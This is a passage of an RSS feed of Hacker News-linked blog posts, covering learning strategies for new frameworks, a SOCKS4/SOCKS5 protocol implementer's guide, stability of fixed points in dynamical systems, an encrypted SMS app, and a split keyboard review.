my opinion, a topic is too broad if you can’t articulate your learning outcomes in a few words to another developer.</p><p id="6bd4">Learning outcomes are statements about knowledge or skill a developer should acquire by the end of their learning journey on a specific topic. Sure, you can learn about a particular topic forever, but there must be a point when you decide for yourself that it is enough, for now. Enough for you to feel confident in working toward and achieving your end goal.</p><p id="dc7e">For example, here are some learning outcomes for learning React Javascript framework.</p><p id="b7ae">By the end of my learning program, I should be able to create a new React app from scratch that can:</p><ul><li id="db4c">Consume JSON payload in a REST API</li><li id="54a3">Refresh the content of the app every <code>x</code> mins</li><li id="d377">Navigate to different screens</li><li id="2fa8">Remember the last screen I visited before (if any)</li><li id="24ff">Be Unit-tested</li></ul><p id="6ee5">Note that the above learning outcomes are not too specific or detailed (like creating a component in JSX syntax, for example) because you don’t know about the ins and outs of the React framework yet. They are not too broad either; there is a clear outcome for each statement instead of just a broad, generic one, like “Create a React app.”</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of multiple waterfalls" src="https://miro.medium.com/max/9216/0*YWDZfhREIQqoJ_fy" width="4608" height="3008" srcset="https://miro.medium.com/max/552/0*YWDZfhREIQqoJ_fy 276w, https://miro.medium.com/max/1104/0*YWDZfhREIQqoJ_fy 552w, https://miro.medium.com/max/1280/0*YWDZfhREIQqoJ_fy 640w, https://miro.medium.com/max/1400/0*YWDZfhREIQqoJ_fy 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*YWDZfhREIQqoJ_fy?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@mikeanywhere?utm_source=medium&amp;utm_medium=referral" rel="noopener">Mike Lewis HeadSmart Media</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="c174">Tutorial fatigue — it’s real. If you think you’re learning something by going through endless books, videos, and tutorials then you’re simply wasting your time. Pick a few options, be it books, videos, or any other format, and stick with them. Chances are what you learn in a video will be very similar to another tutorial that you’re reading on the same topic.</p><p id="7c5d">To give you another example, I did a quick search on Amazon about React Javascript framework, and there were about 700 books on the topic — a few of them even have the exact same book title, <em>Learning React</em>. There is no way you can get through all the books, and even if you did, it is no guarantee that you’ll become an expert at React, or is it a good use of your time.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of a loading screen" src="https://miro.medium.com/max/12096/0*5fuYpC-mFVleIePR" width="6048" height="4024" srcset="https://miro.medium.com/max/552/0*5fuYpC-mFVleIePR 276w, https://miro.medium.com/max/1104/0*5fuYpC-mFVleIePR 552w, https://miro.medium.com/max/1280/0*5fuYpC-mFVleIePR 640w, https://miro.medium.com/max/1400/0*5fuYpC-mFVleIePR 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*5fuYpC-mFVleIePR?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@mike_van_den_bos?utm_source=medium&amp;utm_medium=referral" rel="noopener">Mike van den Bos</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="a189">Having a clear plan and a definite goal is good, but they serve little purpose if you’re not keeping track of how you’re progressing — and if you’re reaching your goals. Review your progress every fortnight, or at least every month, and ask yourself whether you are heading in the right direction.</p><p id="568e">I recommend setting up a reminder in your calendar to review your progress at a regular interval at the start of your learning journey — so you don’t forget about it. If you’re not achieving your goals timely, it’s a chance for you to understand where you may be struggling with and revise your plan. On the other hand, if you’re achieving your goals, celebrate them to keep your momentum and motivation going.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of an apple, some book, crayons" src="https://miro.medium.com/max/7906/0*WItSN7T0lYfj_6P1" width="3953" height="2791" srcset="https://miro.medium.com/max/552/0*WItSN7T0lYfj_6P1 276w, https://miro.medium.com/max/1104/0*WItSN7T0lYfj_6P1 552w, https://miro.medium.com/max/1280/0*WItSN7T0lYfj_6P1 640w, https://miro.medium.com/max/1400/0*WItSN7T0lYfj_6P1 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*WItSN7T0lYfj_6P1?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@element5digital?utm_source=medium&amp;utm_medium=referral" rel="noopener">Element5 Digital</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="1ed7">In this day and age, being an efficient learner gives you an edge and sets you up for your career success. I’m a firm believer that you can get better at anything in life if you take the time to understand the process — and have the willingness to improve. Learning is no exception. It is a skill that can be improved with practice. And knowing what not to do is sometimes as important as knowing what to do when it comes to learning. Just like what Confucius, a Chinese social philosopher, once said:</p><blockquote><p id="e923">“Learning without thought is labor lost; thought without learning is perilous. “— Confucius</p></blockquote></div></div></section></div></div>]]>
            </description>
            <link>https://betterprogramming.pub/5-mistakes-to-avoid-when-learning-a-new-framework-or-programming-language-a8ba9c3f1160</link>
            <guid isPermaLink="false">hacker-news-small-sites-26353601</guid>
            <pubDate>Fri, 05 Mar 2021 06:42:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementer's Guide to Socks (Protocol)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26352945">thread link</a>) | @cookiengineer
<br/>
March 4, 2021 | https://cookie.engineer/weblog/articles/implementers-guide-to-socks.html | <a href="https://web.archive.org/web/*/https://cookie.engineer/weblog/articles/implementers-guide-to-socks.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
				<p>
	Yesterday I was verifying that the SOCKS test suite of 
	 <a href="https://github.com/tholian-network/stealth">Tholian Stealth</a> 
	is working and I realized that writing failsafe tests are not
	as easy as someone might think. So here's my write-up about
	the SOCKS protocol.
</p>
<p>
	The problem with SOCKS in a nutshell is that it is not as well
	documented as someone might think.
</p>
<p>
	Most people are even unaware of the role that a SOCKS proxy plays
	in between network connections and therefore don't know what exactly
	a SOCKS proxy can or cannot do in regards to blocking ads and malicious
	domains.
</p>
<p>
	So I thought that a reference-class article for SOCKS4 and SOCKS5
	would be nice, documenting its quirks and common pitfalls while
	implementing those protocols.
</p>
<p>
	For the implementation we're going to build in this article,
	we only need plain node.js and its 
	 <code>net</code>
	 core stack. The
	implementation will be peer-to-peer, which means it can be used
	for both the client-side and server-side whereas both sides are
	implemented in node.js for the sake of simplicity.
</p>
<h2>Introduction</h2>
<p>
	First off, you have to know that the 
	 <code>SOCKS</code>
	 protocol is specified as
	 <a href="https://tools.ietf.org/html/rfc1928">RFC1928</a> 
	 and
	 <a href="https://tools.ietf.org/html/rfc1929">RFC1929</a> 
	 and didn't change since
	 <code>1996</code>
	 so it's somewhat safe to assume that this is the final version
	of the network protocol.
</p>
<p>
	The SOCKS protocol in general and its role is pretty much what telephone
	operators did in the past. A client connects to the SOCKS proxy and
	requests to connect to a specific target. The proxy tries to connect
	to the target, and if it succeeds reaches through the connection to the
	client.
</p>
<pre>Client: Please let me connect to IP 1.2.3.4.
Proxy:  Trying to connect... please hold the line ...
Proxy:  Here's the connection handle, any further data will be dispatched through automatically.
</pre>
<pre>Client: Please let me connect to IP 1.2.3.4.
Proxy:  Trying to connect... please hold the line ...
Proxy:  Sorry, the given target is not reachable. Please try again later.
Proxy:  *hangs off the phone* Beep Beep Beep.
</pre>
<p>
	As both 
	 <code>SOCKS4</code>
	 and 
	 <code>SOCKS4a</code>
	 were proprietary protocols, they didn't
	have any RFC. 
	 <code>SOCKS5</code>
	 is referring a lot the 
	 <code>SOCKS4</code>
	 protocol and
	its featureset, so reading the RFC is quite complicated if you don't
	know what the older protocol versions actually did feature-wise.
</p>
<p>
	Usually though, most clients and servers that claim to support SOCKS5
	actually only support the 
	 <code>user</code>
	 and 
	 <code>password</code>
	 authentication, not
	the 
	 <code>IPv6</code>
	 or 
	 <code>DNS/UDP</code>
	 related features that come with it.
</p>
<p>
	This implementation will focus mostly on the 
	 <code>IPv4</code>
	 and 
	 <code>IPv6</code>
	differences and will - for the sake of simplicity - only support 
	 <code>TCP</code>
	based connections.
</p>
<p>
	The 
	 <code>SOCKS4</code>
	 featureset
	:
</p>
<ul>
	<li>connects to <code>IPv4</code> (TCP)</li>
</ul>
<p>
	The 
	 <code>SOCKS4a</code>
	 featureset
	:
</p>
<ul>
	<li>connects to <code>IPv4</code> (TCP)</li>
	<li>connects to <code>domain</code> (TCP)</li>
	<li>authentication via <code>user</code> is broken in practice (no password)</li>
</ul>
<p>
	The 
	 <code>SOCKS5</code>
	 featureset
	:
</p>
<ul>
	<li>connects to <code>IPv4</code> (TCP and UDP)</li>
	<li>connects to <code>IPv6</code> (TCP and UDP)</li>
	<li>connects to <code>domain</code> (TCP)</li>
	<li>authentication via <code>user</code> and <code>password</code></li>
</ul>
<h2>SOCKS Protocol and Network States</h2>
<p>
	Describing SOCKS data frames can be kind of complicated, because the
	interpretation of a SOCKS frame is different depending on its network
	state. So I'm trying to document the different network states first,
	so that you know what kind of states on both sides are possible.
</p>
<p>
	We are also going to completely ignore the 
	 <code>SOCKS authentication methods</code>
	,
	because they are broken across every single Browser; and implemented in
	specification violating non-secure non-encrypted manners across every
	piece of source code I've come across.
</p>
<h3>SOCKS Version 4</h3>
<p>
	The SOCKS 
	 <b>Version 4</b>
	 network flow looks like this
	:
</p>
<ul>
	<li>Client sends Connection Request Frame</li>
	<li>Server responds with a Status Frame</li>
</ul>
<p>... and that's pretty much it. Super simple.</p>
<p>
	 <b>SOCKS Version 4 Connection Request Frame</b>
	:
</p>
<pre>+---------+---------+----+----+----+----+----+----+----+----+....+----+
| VERSION | COMMAND | DSTPORT |      DSTIP        | USERID       |NULL|
+---------+---------+----+----+----+----+----+----+----+----+....+----+
     1         1         2              4           variable       1
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which can be either of <code>0x04</code> or <code>0x05</code> .</li>
	<li><code>COMMAND</code> (1 byte) represents the <code>SOCKS command</code> , which can be either of the Commands explained below.</li>
	<li><code>DSTPORT</code> (2 bytes) represents the destination port from <code>1</code> to <code>65535</code> .</li>
	<li><code>DSTIP</code> is an <code>IPv4</code> (4 bytes) represents the destination IP, and encodes 4 digits as <code>0x00</code> to <code>0xFF</code> respectively.</li>
	<li><code>USERID</code> (variable byte length, followed by a <code>NULL</code> terminator byte) represents an authentication mechanism for a user-login; but without a password.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Commands</b>
	:
</p>
<ul>
	<li><code>0x01</code> represents <code>CONNECT</code> and is a TCP/IP connection request which lets the Server established the connection.</li>
	<li><code>0x02</code> represents <code>BIND</code> and is a TCP/IP port binding to allow the Client to establish the connection themselves.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Connection Status Frame</b>
	:
</p>
<pre>+---------+--------+----+----+----+----+----+----+
| VERSION | STATUS | DSTPORT |      DSTIP        |
+---------+--------+----+----+----+----+----+----+
     1         1        2              4
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which can be either of <code>0x04</code> or <code>0x05</code> .</li>
	<li><code>STATUS</code> (1 byte) represents the <code>SOCKS status</code> , which can be either of the Status explained below.</li>
	<li><code>DSTPORT</code> (2 bytes) represents the destination port from <code>1</code> to <code>65535</code> .</li>
	<li><code>DSTIP</code> is an <code>IPv4</code> (4 bytes) represents the destination IP, and encodes 4 digits as <code>0x00</code> to <code>0xFF</code> respectively.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Status Codes</b>
	:
</p>
<ul>
	<li><code>0x5A</code> Request granted.</li>
	<li><code>0x5B</code> Request rejected or failed.</li>
</ul>
<p>
	 <b>SOCKS Version 4 Status Codes for Authentication Mechanism</b>
	:
</p>
<p>(I would not recommend to implement them)</p>
<ul>
	<li><code>0x5C</code> Request failed because Client's <code>identd</code> is not reachable from server.</li>
	<li><code>0x5D</code> Request failed because Client's <code>identd</code> could not confirm the User ID.</li>
</ul>
<h3>SOCKS Version 5</h3>
<p>
	 <b>Important</b>
	:
	 The SOCKS Version 5 protocol is different in
	its network flow and data frame structure; and it has a
	reserved byte with a 
	 <code>0x00</code>
	 value where the SOCKS Version 4
	protocol would otherwise expect a non-NULL byte data.
</p>
<p>
	Additionally, the order of 
	 <code>Destination Port</code>
	 and 
	 <code>Destination Address</code>
	is different from the order specified in SOCKS Version 4.
</p>
<p>
	The SOCKS 
	 <b>Version 5</b>
	 network flow looks like this
	:
</p>
<ol>
	<li>Client and Server authenticate via handshake mechanism.</li>
	<li>Server authenticates or responds with error message.</li>
	<li>Client requests to connect or bind to an IPv4, IPv6 or domain.</li>
	<li>Server responds with connection status.</li>
</ol>
<p>
	 <b>SOCKS Version 5 Handshake Request Frame</b>
	:
</p>
<pre>+---------+----+----+----+....+
| VERSION | NMETHODS| METHODS |
+---------+----+----+----+....+
     1         2      variable
</pre>
<p>
	 <b>SOCKS Version 5 Handshake Response Frame</b>
	:
</p>
<pre>+---------+----+----+
| VERSION | METHOD  |
+---------+----+----+
     1         1
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which is <code>0x05</code> .</li>
	<li><code>NMETHODS</code> (1 byte) represents the byte length of the following encoded <code>METHOD</code> s.</li>
	<li><code>METHODS</code> (variable byte length) represents the encoded SOCKS methods.</li>
</ul>
<p>
	 <b>SOCKS Version 5 Handshake Methods</b>
	:
</p>
<ul>
	<li><code>0x00</code> represents No Authentication required.</li>
	<li><code>0x01</code> represents <code>GSSAPI</code> which is a "secure" context as defined per <a href="https://tools.ietf.org/html/rfc1961">RFC1961</a> .</li>
	<li><code>0x02</code> represents <code>username/password</code> plaintext authentication.</li>
	<li><code>0x80</code> to <code>0xFE</code> are reserved for private methods, but are never used in practice.</li>
	<li><code>0xFF</code> represents No Acceptable methods (in a response).</li>
</ul>
<p>
	 <b>SOCKS Version 5 Connection Request</b>
	:
</p>
<p>
	After the Client and Server have negotiated an Authentication Method,
	the Client sends a Connection Request Frame to the Server.
</p>
<pre>+---------+---------+-----+------+----+----+----+----+
| VERSION | COMMAND | RSV | ATYP | DSTADDR | DSTPORT |
+---------+---------+-----+------+----+----+----+----+
     1         1       1      1    variable     2
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which is <code>0x05</code> .</li>
	<li><code>COMMAND</code> (1 byte) represents either of the Commands explained below.</li>
	<li><code>RSV</code> (1 byte) represents the reserved byte which has to be <code>0x00</code> (to be able to differ it from a SOCKS Version 4 Connection Request).</li>
	<li><code>ATYP</code> (1 byte) represents the address type, which can be either of <code>0x01</code> (IPv4 address), <code>0x03</code> (domain name), <code>0x04</code> (IPv6 address).</li>
	<li><code>DSTADDR</code> (variable) represents the destination address as an IPv4 (in 4 octets), the domain name (with a prefixed byte length), or an IPv6 (in 16 octets).</li>
	<li><code>DSTPORT</code> (2 bytes) represents the destination port from <code>0x01</code> ( <code>1</code> ) to <code>0xFF</code> ( <code>65535</code> ).</li>
</ul>
<p>
	 <b>SOCKS Version 5 Commands</b>
	:
</p>
<ul>
	<li><code>0x01</code> represents <code>CONNECT</code> and is a TCP/IP connection request which lets the Server established the connection and forward further packets.</li>
	<li><code>0x02</code> represents <code>BIND</code> and is a TCP/IP port binding to allow the Client to establish the connection themselves.</li>
	<li><code>0x03</code> represents <code>UDP ASSOCIATE</code> and is a UDP associate request which lets the Server establish the connection and forward further packets.</li>
</ul>
<p>
	 <b>SOCKS Version 5 Connection Status Frame</b>
	:
</p>
<p>
	After the Client has sent the Connection Request frame, the Server responds
	with a Connection Status Frame.
</p>
<pre>+---------+-------+-----+------+----+----+----+----+
| VERSION | REPLY | RSV | ATYP | BNDADDR | BNDPORT |
+---------+-------+-----+------+----+----+----+----+
     1        1      1      1    variable     2
</pre>
<ul>
	<li><code>VERSION</code> (1 byte) represents the <code>SOCKS version</code> , which is <code>0x05</code> .</li>
	<li><code>REPLY</code> (1 byte) represents the reply message to the requested command and is either of the Replies explained below.</li>
	<li><code>RSV</code> (1 byte) represents the reserved byte which has to be <code>0x00</code> (to be able to differ it from a SOCKS Version 4 Connection Request).</li>
	<li><code>ATYP</code> (1 byte) represents the address type, which can be either of <code>0x01</code> (IPv4 address), <code>0x03</code> (domain name), <code>0x04</code> (IPv6 address).</li>
	<li><code>BNDADDR</code> (variable) represents the server-bound destination address as an IPv4 (in 4 octets), the domain name (with a prefixed byte length), or an IPv6 (in 16 octets).</li>
	<li><code>BNDPORT</code> (2 bytes) represents the server-bound destination port from <code>0x01</code> ( <code>1</code> ) to <code>0xFF</code> ( <code>65535</code> ).</li>
</ul>
<p>
	 <b>SOCKS Version 5 Replies</b>
	:
</p>
<ul>
	<li><code>0x00</code> Success</li>
	<li><code>0x01</code> General SOCKS Failure</li>
	<li><code>0x02</code> Connection Not Allowed</li>
	<li><code>0x03</code> Network Unreachable</li>
	<li><code>0x04</code> Host Unreachable</li>
	<li><code>0x05</code> Connection Refused</li>
	<li><code>0…</code></li></ul></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cookie.engineer/weblog/articles/implementers-guide-to-socks.html">https://cookie.engineer/weblog/articles/implementers-guide-to-socks.html</a></em></p>]]>
            </description>
            <link>https://cookie.engineer/weblog/articles/implementers-guide-to-socks.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26352945</guid>
            <pubDate>Fri, 05 Mar 2021 05:03:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stability of Fixed Points of High Dimensional Dynamical Systems]]>
            </title>
            <description>
<![CDATA[
Score 65 | Comments 12 (<a href="https://news.ycombinator.com/item?id=26352308">thread link</a>) | @adipandas
<br/>
March 4, 2021 | https://adipandas.github.io/posts/2021/03/fixed-point-high-dim/ | <a href="https://web.archive.org/web/*/https://adipandas.github.io/posts/2021/03/fixed-point-high-dim/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><header><p> 5 minute read</p><p><strong> Published:</strong> <time datetime="2021-03-04T00:00:00-08:00">March 04, 2021</time></p></header><section itemprop="text"><p>In the <a href="https://adipandas.github.io/posts/2020/02/stable-unstable-fixed-point/">previous post</a>, I discussed the basics regarding the stability of fixed points of a dynamical system and explained it with a simple continuous-time one-dimensional example. In this post, I will discuss fixed points for a general case of a continuous-time $n$-dimensional system.</p><h4 id="fixed-point">Fixed point</h4><p>Just to reiterate, if the ordinary differential equation (ODE) in $\eqref{eq:1}$ represents a dynamical system:</p>\[\dot x = f(x) \label{eq:1}\]<p>Fixed points of this system are given by the roots of the equation $\eqref{eq:2}$:</p>\[\begin{equation} \dot x = f(x) = 0 \label{eq:2} \end{equation}\]<h2 id="fixed-points-of-multi-dimensional-system">Fixed points of Multi-dimensional system</h2><p>My <a href="https://adipandas.github.io/posts/2020/02/stable-unstable-fixed-point/">previous post</a> only explained the definition of fixed point and provided an example with a scalar-valued dynamical system. Now, lets discuss a case of multi-dimensional ODE.</p><p>We will start with the system given by equation $\eqref{eq:3}$:</p>\[\mathbf{\dot x} = \mathbf{f(x)} \label{eq:3}\]<p>where $\mathbf{f}$ is a vector-valued function, $\mathbf{x}$ and $\mathbf{\dot x}$ are $n$-dimensional vectors:</p>\[\mathbf{x, \dot x} \in \mathcal{R}^{n} \label{eq:4}\]<p>We find the fixed points (a.k.a. equilibrium states) of the system by following $\eqref{eq:2}$:</p>\[\mathbf{\dot x_{eq}} = \mathbf{f}(\mathbf{x_{eq}}) = \mathbf{0} \label{eq:5}\]<p>The roots of $\eqref{eq:5}$ will give us the value of $\mathbf{x_{eq}}$, i.e., fixed points of our multi-dimensional system.</p><h2 id="stable-and-unstable-fixed-points">Stable and Unstable Fixed Points</h2><p>We analyzed the system in a one-dimensional case (<a href="https://adipandas.github.io/posts/2020/02/stable-unstable-fixed-point/">here</a>) using a small perturbation $\delta$ at the equilibrium condition of the system. We will follow the similar procedure here as well.</p><p>We evaluated $\mathbf{f}^{\prime}\mathbf{(x)}$ at $\mathbf{x_{eq}}$ to see if our fixed point is stable or unstable. In case of one-dimensional system, it was easy since $f^{\prime}(x_{eq})&gt;0$ is unstable fixed point $x_{eq}$ while it is stable when $f^{\prime}(x_{eq})&lt;0$. In case of high-dimensional system, we cannot do this.</p><p>To analyze the behavior of our $n$-dimensional system at $\mathbf{x_{eq}}$, we will introduce the perturbation $\mathbf{\delta x}$ at $\mathbf{x_{eq}}$. Thus, we end up with the following:</p>\[\begin{align} \mathbf{\dot x_{eq} + \dot {\delta x}} &amp;= \mathbf{f(x_{eq}+\delta x)} \label{eq:6} \end{align}\]<p>Using Taylor expansion on $\eqref{eq:6}$:</p>\[\begin{align} \mathbf{\dot x_{eq} + \delta \dot x = f(x_{eq}) + f^{\prime}(x_{eq}) \delta x + f^{\prime \prime}(x_{eq}) \frac{\delta x^2}{2!} + \dots} \label{eq:7} \end{align}\]<p>But, we know at fixed points, equation $\eqref{eq:5}$ holds and thus, $\eqref{eq:7}$ reduces to $\eqref{eq:8}$.</p>\[\begin{align} \mathbf{ \delta \dot x = f^{\prime}(x_{eq}) \delta x + f^{\prime\prime}(x_{eq}) \frac{\delta x^2}{2!} + \dots} \end{align}\] \[\mathbf{ \delta \dot x = f^{\prime}(x_{eq}) \delta x + H.O.T. \label{eq:8}}\]<p>We can ignore the higher order terms $\mathbf{H.O.T.}$ for values of $\mathbf{\delta{x}}$ close to $\mathbf{0}$, resulting in equation $\eqref{eq:9}$.</p>\[\begin{align} \mathbf{\delta \dot x = f^{\prime}(x_{eq}) \delta x \label{eq:9}} \end{align}\]<p>$\mathbf{f}^{\prime}\mathbf{(x)}$ is the Jacobian of $\mathbf{f(x)}$ at $\mathbf{x_{eq}}$, i.e., a <strong>linear approximation</strong> of our dynamical system $\mathbf{f(x)}$ near $\mathbf{x_{eq}}$ (you can refer <a href="https://adipandas.github.io/posts/2020/03/vector-calculus/#jacobian-aka-derivative-of-vector-valued-function">this</a> for further details on Jacobian).</p>\[\begin{align} \mathbf{f}^{\prime}\mathbf{(x)} &amp;= \left[ \frac{\partial\mathbf{f}}{\partial x_{1}}, \frac{\partial\mathbf{f}}{\partial x_{2}}, \dots, \frac{\partial\mathbf{f}}{\partial x_{n}} \right] \label{eq:11}\\ \mathbf{f}^{\prime}\mathbf{(x)} &amp;= \begin{bmatrix} \frac{\partial{f_{1}}}{\partial x_{1}} &amp; \frac{\partial{f_{2}}}{\partial x_{2}} &amp; \dots &amp; \frac{\partial{f_{n}}}{\partial x_{n}}\\ \vdots &amp; \ddots &amp; \ddots &amp; \vdots \\ \frac{\partial{f_{n}}}{\partial x_{1}} &amp; \frac{\partial{f_{n}}}{\partial x_{2}} &amp; \dots &amp; \frac{\partial{f_{n}}}{\partial x_{n}}\\ \end{bmatrix} \label{eq:12} \end{align}\]<p>Using this Jacobian, equation $\eqref{eq:12}$, at our fixed point $\mathbf{x_{eq}}$ for the dynamical system under consideration, we can calculate its <a href="https://en.wikipedia.org/wiki/Eigenvalues_and_eigenvectors"><strong>eigenvalues</strong></a> and interpret the results of the fixed point.</p><p>Therefore, we find the eigenvalues for equation $\eqref{eq:13}$,</p>\[\begin{align} \mathbf{f}^{\prime}(\mathbf{x_{eq}}) \mathbf{x_{eq}} = \lambda \mathbf{x_{eq}} \label{eq:13} \end{align}\]<p>Here, $\lambda$ denotes the eigenvalue of the system. The roots of $\eqref{eq:13}$ are the eigenvalues the dynamical system at the fixed point $\mathbf{x}=\mathbf{x_{eq}}$.</p><h3 id="eigenvalue-interpretation-">Eigenvalue interpretation <a name="eigen_value_interpretation"></a></h3><p>For a continuous-time nonlinear dynamical system given by $\eqref{eq:3}$, the eigenvalues $\lambda$ that are found as roots of equation $\eqref{eq:13}$ can be interpreted as:</p><ul><li>If any of the eigenvalues have a real part $Re(\lambda)&gt;0$: $\mathbf{x_{eq}}$ is an unstable fixed point.</li><li>If all $Re(\lambda)&lt;0$: $\mathbf{x_{eq}}$ is a stable fixed point.</li><li>If $\lambda=0$: $\mathbf{x_{eq}}$ is a neutral fixed point.</li><li>If eigenvalues $\lambda$ are complex conjugates, i.e., $Im(\lambda) \ne 0$: The dynamical system has oscillatory behavior around the fixed point.</li></ul><h3 id="important-points-to-note-regarding-this-article">Important points to note regarding this article</h3><p>In this post, we discussed a general case of interpreting the fixed points of a dynamical system. By general, I mean $\mathbf{f(x)}$ is a non-linear, continuous-time vector-valued function representing a dynamical system. Below are certain points one should note about any non-linear dynamical system:</p><ul><li>We assumed that the system is non-linear and linearized it using Taylor series expansion near its fixed point (a.k.a. equilibrium).</li><li>We evaluated the stability of a fixed point <strong>near</strong> the equilibrium condition by perturbing the system ($\mathbf{x_{eq}}+\mathbf{\delta x}$).</li><li>This approach of interpreting the stability of the system by linearizing it near the equilibrium <strong>does not tell much</strong> about a system’s asymptotic behavior at large.<ul><li>We only understand how the system behaves <strong>locally</strong> or <strong>in the neighborhood of the fixed points</strong>.</li></ul></li><li>In practical or real-world systems, it may not be possible to interpret the global stability characteristics of the system. Thus, the stability analysis around the neighborhood of the fixed point is useful for many practical applications such as sustaining a non-linear system’s state near or at the fixed point.</li><li>In general, global asymptotic behaviors of any non-linear dynamical system can be complex and there are no systematic methods to predict and analyze such behaviors.</li></ul><h3 id="references-and-further-readings">References and Further Readings:</h3><ul><li>Deshpande, A. M. Stablility of Fixed Point of a Dynamical System. [<a href="https://adipandas.github.io/posts/2020/02/stable-unstable-fixed-point/">web</a>]</li><li>Strogatz, Steven H. Nonlinear dynamics and chaos with student solutions manual: With applications to physics, biology, chemistry, and engineering. CRC press, 2018.</li><li>Khalil, Hassan K. “Lyapunov stability.” <em>Control Systems, Robotics and AutomatioN–Volume XII: Nonlinear, Distributed, and Time Delay Systems-I</em> (2009): 115.</li><li>Bomze, Immanuel M., and Jörgen W. Weibull. “Does neutral stability imply Lyapunov stability?.” <em>Games and Economic Behavior</em> 11.2 (1995): 173-192.</li><li>Fixed point. [<a href="https://mathworld.wolfram.com/FixedPoint.html">web</a>]</li><li>Jacobian matrix [<a href="https://www.youtube.com/watch?v=bohL918kXQk">video</a>]</li><li>Stability Theory. [<a href="https://en.wikipedia.org/wiki/Stability_theory">web</a>]</li><li>Lyapunov Stability. [<a href="https://en.wikipedia.org/wiki/Lyapunov_stability">web</a>]</li></ul></section><!--<nav class="pagination"> <a href="https://adipandas.github.io/posts/2020/03/vector-calculus/" class="pagination--pager" title="Notes on Vector Calculus ">Previous</a> <a href="https://adipandas.github.io/posts/2021/03/biasvariancetradeoff/" class="pagination--pager" title="Bias, Variance and Trade-off ">Next</a></nav>--></div></div>]]>
            </description>
            <link>https://adipandas.github.io/posts/2021/03/fixed-point-high-dim/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26352308</guid>
            <pubDate>Fri, 05 Mar 2021 03:38:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Silence – GPL-Licensed Encrypted SMS/MMS for Android]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26352086">thread link</a>) | @jhabdas
<br/>
March 4, 2021 | https://git.silence.dev/Silence/Silence-Android/ | <a href="https://web.archive.org/web/*/https://git.silence.dev/Silence/Silence-Android/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div>
<p data-sourcepos="1:1-1:46" dir="auto">A fork of Signal with only SMS/MMS encryption.</p>
</div>

</div></div>]]>
            </description>
            <link>https://git.silence.dev/Silence/Silence-Android/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26352086</guid>
            <pubDate>Fri, 05 Mar 2021 03:09:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Ultimate Hacking Keyboard: A long term report]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26351600">thread link</a>) | @azhenley
<br/>
March 4, 2021 | https://unhexium.net/hardware/the-ultimate-hacking-keyboard-months-of-use/ | <a href="https://web.archive.org/web/*/https://unhexium.net/hardware/the-ultimate-hacking-keyboard-months-of-use/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <div>
      <p>In December of 2018 I finally received my UHK after months of waiting.</p>

<p>After using it daily since, I’m 100% convinced that the UHK is worth the asking price, probably more, and I’m happy that I got it at an early adopter discount.</p>

<p>Currently at $275 USD it’s definitely priced like the split ergonomic keyboard that it is, but what I think makes this one worth that is the open source, hackable nature of the keyboard.</p>

<p>Here’s my thoughts after using it as my daily driver for many months,</p>



<p>At first, I wasn’t a complete believer in Kailh keyswitches, but they’ve held up very well and show no signs of losing their feel. Still prefer Cherry for the desktop fullsize keyboards at home, but on the go and around school I’ve still had a good experience with these switches.</p>

<p>For some reason, they offered Cherry Clear and Cherry Green, no other Browns besides Kailh. Since I was planning on using this board to take notes in class, low noise was a high priority.</p>

<p>After a month or two, the switches were still a bit loud to use for notes in quiet lectures, so I bought and installed some generic o-rings which helped to reduce the keycap to board noise, but the springback action was still tell-tale sound of a mechanical keyboard.</p>

<p>Overall the feel of of the keyboard has been excellent and there’s been no hunting for keys as everything is exactly where I expect it to be.</p>



<p>The #1 eye-catching feature is for sure the splitting action.</p>

<p>I pull it out of a carrying case in one piece, and it looks whole, then it “appears I just rip my keyboard in half” as one fellow student commented.</p>

<p>But the aesthetics of the keyboard are nothing compared to how much better my carpal tunnel syndrome improved since using the UHK in place of my laptop keyboard. In fact, the primary reason I bought the UHK was to deal with carpal tunnel and I’m impressed how I’ve recovered without losing any real productivity.</p>

